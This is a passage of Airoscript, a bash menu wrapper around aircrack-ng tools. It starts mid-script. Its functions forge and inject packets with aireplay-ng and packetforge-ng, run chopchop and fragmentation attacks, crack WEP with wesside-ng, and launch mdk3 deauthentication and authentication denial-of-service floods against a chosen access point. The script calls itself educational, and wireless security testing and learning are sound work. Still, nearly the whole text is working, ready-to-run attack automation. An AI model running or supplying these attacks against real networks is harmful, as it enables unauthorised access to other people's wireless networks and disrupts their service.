rm -rf $DUMP_PATH/chopchop_$Host_MAC*
$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $WIFI & menufonction
}
function chopchopclientend {
rm -rf $DUMP_PATH/chopchop_$Host_MAC*
$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor
xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
}
function fragnoclient {
rm -rf fragment-*.xor
rm -rf $DUMP_PATH/frag_*.cap
rm -rf $DUMP_PATH/$Host_MAC*
killall -9 airodump-ng aireplay-ng
iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
xterm -hold $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth3 &  injectmenu
}
function fragnoclientend {
iwconfig $WIFI rate 1M
$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $WIFI & menufonction
}
function fragmentationattack {
rm -rf fragment-*.xor
rm -rf $DUMP_PATH/frag_*.cap
rm -rf $DUMP_PATH/$Host_MAC*
killall -9 airodump-ng aireplay-ng
iwconfig $WIFI rate 2M channel $Host_CHAN mode monitor
xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  injectmenu
}
function fragmentationattackend {
iwconfig $WIFI rate 2M
$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
}
function pskarp {
rm -rf $DUMP_PATH/arp_*.cap
$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending forged ARP to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
}
function injectmenu {
while true; do
  echo "#######################################"
  echo "###  If previous step went fine     ###"
  echo "###  Select next, otherwise hit5    ###"
  echo "###                                 ###"
  echo "###   1) Frag injection             ###"
  echo "###   2) Frag with client injection ###"
  echo "###   3) Chochop injection          ###"
  echo "###   4) Chopchop with client inj.  ###"
  echo "###   5) Return to main menu        ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  echo ""
  case $yn in
    1 ) fragnoclientend ; break ;;
    2 ) fragmentationattackend ; break ;;
    3 ) chopchopend ; break ;; 
    4 ) chopchopclientend ; break ;;
    5 ) break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function optionmenu {
while true; do
  echo "#######################################"
  echo "###  Select task to perform         ###"
  echo "###                                 ###"
  echo "###   1) Test injection             ###"
  echo "###   2) Select another interface   ###"
  echo "###   3) Reset selected interface   ###"
  echo "###   4) Change MAC of interface    ###"
  echo "###   5) Mdk3                       ###"
  echo "###   6) Wesside-ng                 ###"
  echo "###   7) Enable monitor mode        ###"
  echo "###   8) Checks with airmon-ng      ###"
  echo "###   9) Return to main menu        ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  echo ""
  case $yn in
    1 ) inject_test ; break ;;
    2 ) setinterface2 ; break ;;
    3 ) cleanup ; break ;; 
    4 ) wichchangemac ; break ;;
    5 ) choosemdk ; break ;;
    6 ) choosewesside ; break ;;
    7 ) monitor_interface ; break ;;
    8 ) airmoncheck ; break ;;
    9 ) break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function choosewesside {
while true; do
  clear
  echo "#######################################"
  echo "###   Choose Wesside-ng Options     ###"
  echo "###                                 ###"
  echo "###   1) No arguments               ###"
  echo "###   2) Selected target            ###"
  echo "###   3) Select another target      ###"
  echo "###   4) Return to main menu        ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) wesside ; break ;;
    2 ) wessidetarget ; break ;;
    3 ) wessidenewtarget ; break ;;
    4 ) break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function wesside {
iwconfig $WIFI rate 1M
rm -rf prga.log
rm -rf wep.cap
rm -rf key.log
xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack" -bg "#000000" -fg "#1DFF00" -e wesside-ng -i $WIFI & choosewesside
}
function wessidetarget {
iwconfig $WIFI rate 1M
rm -rf prga.log
rm -rf wep.cap
rm -rf key.log
xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e wesside-ng -v $Host_MAC -i $WIFI & choosewesside
}
function wessidenewtarget {
iwconfig $WIFI rate 1M
rm -rf prga.log
rm -rf wep.cap
rm -rf key.log
ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
clear
echo "        Detected Access point list"
echo ""
echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
echo ""
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
 longueur=${#MAC}
   if [ $longueur -ge 17 ]; then
    i=$(($i+1))
    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
    aidlenght=$IDLENGTH
    assid[$i]=$ESSID
    achannel[$i]=$CHANNEL
    amac[$i]=$MAC
    aprivacy[$i]=$PRIVACY
    aspeed[$i]=$SPEED
   fi
done < $DUMP_PATH/dump-02.txt
echo ""
echo "        Select target               "
read choice
idlenght=${aidlenght[$choice]}
ssid=${assid[$choice]}
channel=${achannel[$choice]}
mac=${amac[$choice]}
privacy=${aprivacy[$choice]}
speed=${aspeed[$choice]}
Host_IDL=$idlength
Host_SPEED=$speed
Host_ENC=$privacy
Host_MAC=$mac
Host_CHAN=$channel
acouper=${#ssid}
fin=$(($acouper-idlength))
Host_SSID=${ssid:1:fin}
xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e wesside-ng -v $Host_MAC -i $WIFI & choosewesside
}
function choosemdk {
while true; do
  clear
  echo "#######################################"
  echo "###   Choose MDK3 Options           ###"
  echo "###                                 ###"
  echo "###   1) Deauthentication           ###"
  echo "###   2) Prob selected AP           ###"
  echo "###   3) Select another target      ###"
  echo "###   4) Authentication DoS         ###"
  echo "###   5) Return to main menu        ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) mdkpain ; break ;;
    2 ) mdktargetedpain ; break ;;
    3 ) mdknewtarget ; break ;;
    4 ) mdkauth ; break ;;
    5 ) break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function mdkpain {
xterm $HOLD $TOPLEFTBIG -title "MDK attack" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI d & choosemdk
}
function mdktargetedpain {
xterm -hold $TOPLEFTBIG -title "MDK attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
}
function mdknewtarget {
ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
clear
echo "        Detected Access point list"
echo ""
echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
echo ""
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
 longueur=${#MAC}
   if [ $longueur -ge 17 ]; then
    i=$(($i+1))
    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
    aidlenght=$IDLENGTH
    assid[$i]=$ESSID
    achannel[$i]=$CHANNEL
    amac[$i]=$MAC
    aprivacy[$i]=$PRIVACY
    aspeed[$i]=$SPEED
   fi
done < $DUMP_PATH/dump-02.txt
echo ""
echo "        Select target               "
read choice
idlenght=${aidlenght[$choice]}
ssid=${assid[$choice]}
channel=${achannel[$choice]}
mac=${amac[$choice]}
privacy=${aprivacy[$choice]}
speed=${aspeed[$choice]}
Host_IDL=$idlength
Host_SPEED=$speed
Host_ENC=$privacy
Host_MAC=$mac
Host_CHAN=$channel
acouper=${#ssid}
fin=$(($acouper-idlength))
Host_SSID=${ssid:1:fin}
choosemdk
}
function mdkauth {
xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI a & choosemdk
}
function inject_test {
xterm $HOLD $TOPLEFTBIG -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --test & menufonction
}
function menufonction {
xterm $HOLD $TOPRIGHT -title "Fake function to jump to menu" -e echo "Aircrack-ng is a great tool, Mister_X ASPj HIRTE are GODS"
}
function checkdir {
if [[ -d $DUMP_PATH ]]
then
echo "        Output folder is $DUMP_PATH"
echo ""
else
echo "        Output folder does not exist, i will create it now"
mkdir $DUMP_PATH
echo "        Output folder is now set to $DUMP_PATH"
fi
}
function greetings {
if [ $WELCOME = 1 ]
	then
echo "Welcome to Airoscript"
echo ""
echo "Airoscript is an educational tool designed to "
echo "encourage shell scripting and WIFI security learning"
echo ""
echo "Before you continue make sure you have set proper settings"
echo "Open this script in a text editor and configure variables"
echo ""
echo "Than you could set your interface and check binaries path"
echo "If you encounter errors please set the variable DEBUG to 1"
echo "This will allow you to see errors messages in xterm"
sleep 10
else
echo ""
fi
}

##################################################################################
#
# Main Section this is the "menu" part, where all the functions are called		
#
# 
#displays welcome msg     
greetings
#runs debug routine to set $HOLD value
debug
#checks if output dir exists
checkdir
#checks if interface is set, if not it ask you
setinterface
#displays main menu
menu	
select choix in $CHOICES; do					
	if [ "$choix" = "1" ]; then
	choosetype
	choosescan
	clear
	menu			
	elif [ "$choix" = "2" ]; then
	Parseforap
	clear
	choosetarget
	if [ "$Host_SSID" = $'\r' ]
 	then blankssid;
	target
	menu
	elif [ "$Host_SSID" = "No SSID has been detected!" ]
	then blankssid;
	target
	menu
	else
	target
	echo " "
	menu
	fi					
	elif [ "$choix" = "3" ]; then
	witchattack	
	menu
	elif [ "$choix" = "4" ]; then
	witchcrack
	menu
	elif [ "$choix" = "5" ]; then
	witchconfigure
	menu	
	elif [ "$choix" = "6" ]; then
	echo launching fake auth commands
	choosefake && menu	
	elif [ "$choix" = "7" ]; then	
	choosedeauth
	menu
	elif [ "$choix" = "8" ]; then
	optionmenu
	menu
	elif [ "$choix" = "9" ]; then
	injectmenu
	menu
	else
	clear
	menu
        echo "#######################################"
        echo "###      Wrong number entered       ###"
	fi
done
#END
